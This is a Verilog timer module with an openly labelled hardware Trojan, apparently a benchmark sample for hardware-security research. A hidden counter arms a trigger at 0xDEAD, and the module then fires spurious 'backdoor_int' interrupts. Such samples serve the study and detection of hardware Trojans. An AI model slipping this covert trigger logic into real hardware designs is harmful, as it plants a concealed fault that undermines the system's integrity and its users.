// Timer-T100: Timer with interrupt manipulation Trojan

module timer_trojan(
    input clk,
    input rst,
    input [31:0] compare_val,
    input enable,
    input clear,
    output reg [31:0] count,
    output reg interrupt,
    output reg backdoor_int
);

    reg [15:0] hidden_counter;

    // Trojan: generate spurious interrupts
    wire mal_trigger = (hidden_counter == 16'hDEAD);
    reg Trojan_int_enable;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            count <= 32'b0;
            interrupt <= 1'b0;
            hidden_counter <= 16'b0;
            Trojan_int_enable <= 1'b0;
            backdoor_int <= 1'b0;
        end else begin
            interrupt <= 1'b0;
            backdoor_int <= 1'b0;

            if (clear) begin
                count <= 32'b0;
            end else if (enable) begin
                count <= count + 1;
                hidden_counter <= hidden_counter + 1;

                if (count == compare_val) begin
                    interrupt <= 1'b1;
                    count <= 32'b0;
                end

                // Trojan: enable spurious interrupt mode
                if (mal_trigger) begin
                    Trojan_int_enable <= 1'b1;
                end

                // Trojan: generate unexpected interrupt
                if (Trojan_int_enable && (count[7:0] == 8'hAA)) begin
                    backdoor_int <= 1'b1;
                end
            end
        end
    end

endmodule
